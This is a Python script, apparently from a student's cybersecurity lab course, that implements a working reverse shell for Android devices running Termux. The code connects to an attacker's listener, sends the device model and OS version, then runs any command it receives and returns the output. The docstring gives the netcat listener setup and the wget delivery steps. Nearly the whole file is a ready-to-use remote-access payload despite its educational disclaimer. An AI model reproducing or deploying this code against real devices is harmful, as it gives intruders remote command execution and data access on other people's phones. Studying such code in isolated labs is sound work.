"""
android_reverse_shell.py
========================
Educational Reverse Shell — Android via Termux (Victim-Side Script)

Author      : Mahrukh
Course      : Cybersecurity Lab
Environment : Isolated Lab (Bridged Network — Android + Kali on same LAN)
Purpose     : Demonstrates how a Python-based reverse shell operates on Android
              using the Termux environment. Includes device fingerprinting,
              heartbeat messages, and timestamped logging.

WARNING     : For academic/educational use only.
              Only run on devices you own in an isolated lab environment.
              See DISCLAIMER.md for full legal notice.

Lab Setup   :
  - Attacker : Kali Linux (192.168.0.106), Netcat listener on port 4444
  - Victim   : Samsung Android SM-A145F, Android 15, running Termux
  - Network  : Bridged Adapter (Kali) — both on same local network

Prerequisites (in Termux):
  $ pkg update && pkg upgrade
  $ pkg install python

Usage       :
  On Kali (start listener first):
    $ nc -lvnp 4444

  Transfer script to Android via HTTP server:
    $ python3 -m http.server 8080          # on Kali
    $ wget http://192.168.0.106:8080/android_reverse_shell.py  # in Termux

  On Android Termux (execute payload):
    $ python3 android_reverse_shell.py

How It Works:
  1. Creates a TCP socket and connects to the attacker machine
  2. Sends device info (model, Android version) on initial connection
  3. Enters a loop: sends heartbeat, waits for command, executes, returns output
  4. Logs all events with timestamps to a local log file
  5. Handles errors gracefully and closes socket in all exit cases
"""

import socket       # For network communication
import subprocess   # To run system commands
import os           # To interact with Android system properties
import time         # For delays and timestamps

# ── Configuration ───────────────────────────────────────────────────────────
KALI_IP   = "192.168.0.106"    # Attacker IP (Kali Linux)
KALI_PORT = 4444               # Listener port (must match nc -lvnp PORT)
LOG_FILE  = "/data/data/com.termux/files/home/connection_log.txt"
HEARTBEAT_INTERVAL = 10        # Seconds between heartbeat messages
# ────────────────────────────────────────────────────────────────────────────


def log_event(message):
    """Append a timestamped log entry to the local log file."""
    with open(LOG_FILE, "a") as log:
        log.write(f"[LOG] {time.ctime()} - {message}\n")


def get_device_info():
    """
    Retrieve Android device model and OS version using system properties.
    getprop is an Android-specific tool available in Termux.
    """
    model   = os.popen("getprop ro.product.model").read().strip()
    version = os.popen("getprop ro.build.version.release").read().strip()
    return model, version


def main():
    try:
        # Establish TCP connection to attacker
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((KALI_IP, KALI_PORT))

        # Send device identification info to attacker
        model, version = get_device_info()
        s.sendall(b"[+] Android (Termux) connected\n")
        s.sendall(f"Model: {model}\n".encode())
        s.sendall(f"Android Version: {version}\n".encode())
        log_event("Connection established with server")

        while True:
            # Send periodic heartbeat to confirm the session is alive
            s.sendall(b"[HB] Android Termux alive\n")

            # Receive command from attacker
            cmd = s.recv(1024).decode().strip()

            # Exit loop on quit command
            if cmd.lower() in ["exit", "quit"]:
                log_event("Session terminated by server")
                break

            # Execute command and return output
            if cmd:
                output = subprocess.getoutput(cmd)
                s.sendall((output + "\n").encode())
                log_event(f"Executed: {cmd}")

            # Wait before next heartbeat
            time.sleep(HEARTBEAT_INTERVAL)

    except Exception as e:
        log_event(f"Error: {str(e)}")

    finally:
        # Always close the socket, even on error
        s.close()


if __name__ == "__main__":
    main()
